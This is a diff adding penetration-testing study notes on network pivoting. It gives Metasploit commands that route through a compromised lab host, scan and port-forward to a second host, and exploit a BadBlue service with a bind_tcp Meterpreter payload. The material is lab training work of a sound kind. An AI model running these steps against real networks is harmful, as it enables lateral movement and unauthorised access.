@@ -811,6 +811,35 @@ Pivoting
 -------
 
 Pivoting is a post exploitation technique that involves utilizing the compromised device that is connected to multiple networks to gain access
-to systems within other networks
+to systems within other networks. Need to understand port forwarding
 
+victim1: 10.0.31.174
+victim2: 10.0.17.153
+
+You already need to have a victim1 session. After that addroute to victim2 by creating a gateway
+
+meterpreter> run addroute -s 10.0.31.0/20
+ 	   > background
+
+Listen the victim2 port with scanner/portscan/tcp
+
+msf5> search portscan
+[+] 10.0.17.153:          - 10.0.17.153:80 - TCP OPEN
+
+Start portfowarding in victim1 session
+--------------------------------------
+meterpreter > portfwd add -l 1234 -p 80 -r 10.0.17.153
+
+To confirm the port in your host
+---------------------------------
+#netstat -ant
+#nmap -p 1234 -sV 10.0.17.153
+
+Service name badblue
+
+Attack the badblue with bind_tcp and get victim2 access
+
+msf5 exploit(/windows/....) > set payload windows/meterpreter/bind_tcp
+			    > set RHOSTS 10.0.17.153
+			    > run
 _________________________________________________________________________________________________________________________________
